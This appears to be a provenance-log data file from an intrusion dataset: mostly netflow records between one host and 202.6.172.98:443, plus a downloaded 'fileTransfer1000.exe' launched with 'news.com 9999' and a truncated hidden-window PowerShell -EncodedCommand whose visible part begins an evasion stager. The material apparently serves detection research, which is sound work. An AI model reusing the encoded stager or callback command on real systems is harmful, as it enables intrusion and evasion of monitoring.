49a7973d-31bb-4574-9e74-a70454f62acf,{'subject': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe None'},5956
5f469a02-2687-4c78-b5cb-df733f3f661c,{'netflow': '202.6.172.98:443->142.20.57.246:53962'},855884
f7622acd-5f97-4b79-8713-853a861de0c3,{'netflow': '142.20.57.246:54002->202.6.172.98:443'},859980
0a5884dc-a64b-4850-be65-421b2f6b773a,{'netflow': '142.20.57.246:53798->202.6.172.98:443'},843601
fddb42aa-3109-42da-ab73-351dafc700df,{'netflow': '202.6.172.98:443->142.20.57.246:53370'},829266
02395f37-2853-4b1e-854b-ee60e5e458a9,{'netflow': '202.6.172.98:443->142.20.57.246:53371'},829267
7933d10b-2cd6-4eaa-983c-263ecb6ea7c0,{'netflow': '142.20.57.246:53993->202.6.172.98:443'},857938
c8853dee-9084-4862-a6a6-94d6d8d5f449,{'netflow': '142.20.57.246:53373->202.6.172.98:443'},829269
4c8da503-a5e3-40b6-b8f2-bfe03467f240,{'netflow': '142.20.57.246:53341->202.6.172.98:443'},827222
7b2a1fac-fa74-437b-a43a-147fd0f786a1,{'netflow': '202.6.172.98:443->142.20.57.246:54002'},859990
f7f45c8a-5b49-4f86-9c3f-8b3de11559ac,{'netflow': '142.20.57.246:53372->202.6.172.98:443'},829268
7ef24c01-dbda-42d4-ae6a-af018eff3cba,{'netflow': '142.20.57.246:53456->202.6.172.98:443'},837465
4198a4d8-ab84-4ca1-926a-50a94c76471a,{'netflow': '142.20.57.246:53309->202.6.172.98:443'},825178
381d9f06-205b-4373-8803-9805573619aa,{'subject': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe None'},5970
29733f9f-bd8d-4b68-bec4-e595638770c8,{'netflow': '202.6.172.98:443->142.20.57.246:53309'},825185
c7fef3f6-3ac7-4a24-9239-673435b7b393,{'netflow': '142.20.57.246:53442->202.6.172.98:443'},835429
9b982a36-0db7-4beb-9043-e0cd4286d68f,{'netflow': '142.20.57.246:53483->202.6.172.98:443'},839529
6f332007-2676-41cb-9461-6d60bf2b3f08,{'netflow': '142.20.57.246:53948->202.6.172.98:443'},853873
ad844212-0c75-40f6-bad7-cf7546e35d87,{'netflow': '142.20.57.246:53374->202.6.172.98:443'},829298
619d6d77-cd87-4fea-b4c1-594788bbd011,{'netflow': '142.20.57.246:53885->202.6.172.98:443'},845683
3d273314-76e8-4858-90a5-71dd7f6a2588,{'netflow': '202.6.172.98:443->142.20.57.246:53948'},853874
03fb6007-9fa8-4ce9-8a3b-5d25cba807a7,{'netflow': '202.6.172.98:443->142.20.57.246:53456'},837498
8a349cc7-6a84-42b6-be0e-bf758834cea0,{'netflow': '202.6.172.98:443->142.20.57.246:53993'},857981
2ce1ffbf-fad6-4e27-a3c1-2f23698c514e,{'netflow': '142.20.57.246:53915->202.6.172.98:443'},847741
884473a5-c865-47c4-9cbb-d7bf1d8ccbd2,{'netflow': '142.20.57.246:53937->202.6.172.98:443'},851847
072062cb-4329-403a-844e-72a70d9ac6a0,{'netflow': '202.6.172.98:443->142.20.57.246:53798'},843656
45a2d390-245f-4bf1-97f9-dd9422ed8cce,{'file': '/Device/HarddiskVolume1/windows/system32/mobsync.exe'},79751
c176a339-c0b7-41f1-98f5-87ec4acd7e79,{'netflow': '202.6.172.98:443->142.20.57.246:53442'},835466
ac67918f-cd3a-4a83-b14f-7ff779255471,{'netflow': '142.20.57.246:53282->202.6.172.98:443'},823180
e519a49c-b940-41ca-b570-8fc4568779f6,{'netflow': '202.6.172.98:443->142.20.57.246:53483'},839566
3faba69a-8c4f-4ae4-b292-54c374a6533e,{'subject': 'powershell.exe C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB'},3986
276f0283-fe2b-41cc-b9c7-b9912b21b7f4,{'netflow': '202.6.172.98:443->142.20.57.246:53885'},845716
b6f1489e-839f-4b12-b97d-6bb5b3caafae,{'netflow': '202.6.172.98:443->142.20.57.246:49980'},806806
262151aa-40e1-48a2-b98b-9c92aae4e7d1,{'netflow': '202.6.172.98:443->142.20.57.246:53392'},831383
fc9feb4a-14cc-4a2d-ba93-27dbe5c390dc,{'netflow': '202.6.172.98:443->142.20.57.246:49969'},804765
ae8be5bc-0b48-4c8b-a59b-225221f6a6c9,{'netflow': '142.20.57.246:53392->202.6.172.98:443'},831389
281edc04-1ee7-4f6c-b274-cdc16b30da87,{'subject': 'powershell.exe None'},4002
9ffae81a-3c51-40b1-9789-b19c1980a755,{'subject': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe None'},6053
97190465-6df3-4923-a534-2ef6571fa299,{'netflow': '202.6.172.98:443->142.20.57.246:53372'},829353
d7c1b8ca-b9c5-4ddd-a5f7-b6eb91ccb73d,{'netflow': '202.6.172.98:443->142.20.57.246:53373'},829354
92f601d0-66a2-4bce-a928-1277d3d276dc,{'netflow': '202.6.172.98:443->142.20.57.246:53282'},823211
5931cc4c-cf2a-4918-8ddd-8bc705673b48,{'netflow': '142.20.57.246:53432->202.6.172.98:443'},833452
dc5c5a17-6f3e-49a8-b0ee-5b063676db1d,{'netflow': '202.6.172.98:443->142.20.57.246:53915'},847791
c6276338-28ed-4b24-b347-71b0c7daadaa,{'netflow': '142.20.57.246:53923->202.6.172.98:443'},849845
dbb615e3-1e9f-45f3-a926-52b00ff7ac3c,{'subject': '/SystemRoot/System32/smss.exe fileTransfer1000.exe  news.com 9999 '},6072
2ca6f0e0-c7b4-4db7-87eb-72ce7802d4dc,{'netflow': '142.20.57.246:53950->202.6.172.98:443'},853948
dfa8e8ed-aff0-4932-aca3-2e394fb2d732,{'netflow': '202.6.172.98:443->142.20.57.246:53923'},849854
86cdc47a-a13e-4bc4-a5f2-012586bfcd96,{'netflow': '142.20.57.246:53484->202.6.172.98:443'},839617
cd25fad9-f2c5-45ce-926e-8f30ffebaada,{'netflow': '202.6.172.98:443->142.20.57.246:53950'},853954
822fdbe8-d1ea-4a62-9d98-1be3d6dae5fa,{'netflow': '142.20.57.246:53249->202.6.172.98:443'},821185
d72b57fa-3a96-41f4-8b55-af004214b6c8,{'netflow': '142.20.57.246:53310->202.6.172.98:443'},825282
f6f8ac66-f791-404c-91a4-6d82d37f4234,{'netflow': '142.20.57.246:49996->202.6.172.98:443'},808901
62fc2e0c-b65f-46f5-9eb5-dd86c9aba946,{'netflow': '142.20.57.246:53952->202.6.172.98:443'},853959
4d90f34c-ced7-4265-b51c-6aa8b66f4b7e,{'netflow': '202.6.172.98:443->142.20.57.246:53484'},839626
9b0478ba-9ede-4925-82c1-a890728b74d9,{'netflow': '202.6.172.98:443->142.20.57.246:53432'},833483
5fd553a7-a99f-4d00-b375-2e956186aebd,{'netflow': '202.6.172.98:443->142.20.57.246:53952'},853962
fb2bf7eb-66c0-4324-ab27-1ec5ccea660a,{'netflow': '202.6.172.98:443->142.20.57.246:53937'},851928
9fd478e3-4cda-4b7c-92c2-266362a1558d,{'netflow': '142.20.57.246:53916->202.6.172.98:443'},847839
d1227a7d-b46c-4397-8ae5-cfb1aaa10f0c,{'netflow': '202.6.172.98:443->142.20.57.246:49996'},808929
cb99d523-2af9-42f7-933f-c365aedadf5c,{'netflow': '142.20.57.246:53497->202.6.172.98:443'},841697
3c5fb65e-4d08-43d9-a121-928d0a083a92,{'netflow': '142.20.57.246:53342->202.6.172.98:443'},827361
2e22d24d-0a6a-49dd-bf1a-ab372d4c9d91,{'netflow': '142.20.57.246:49970->202.6.172.98:443'},804834
b230dfac-242d-4b7b-9c10-d5a3a970eb62,{'netflow': '202.6.172.98:443->142.20.57.246:49970'},804837
50124e85-32e5-4673-9839-f9e88a2b7506,{'netflow': '142.20.57.246:53283->202.6.172.98:443'},823266
55a0dadd-8f8d-4476-9ccf-a4c344243ae5,{'netflow': '202.6.172.98:443->142.20.57.246:53249'},821226
aebf3477-bf87-4a40-beb9-7914d1b54a96,{'netflow': '202.6.172.98:443->142.20.57.246:53283'},823275
e47673a6-56aa-4a74-af72-1e0b4aab396c,{'netflow': '202.6.172.98:443->142.20.57.246:53341'},827370
c38a812a-74dd-456f-91b4-d2bc606f3d6b,{'netflow': '202.6.172.98:443->142.20.57.246:53310'},825333
f271f13b-31f7-4ba4-9c42-a7c1692244af,{'netflow': '142.20.57.246:53443->202.6.172.98:443'},835577
d6c30d9f-cbe0-47c5-873b-ee15996d646b,{'netflow': '142.20.57.246:54003->202.6.172.98:443'},860156
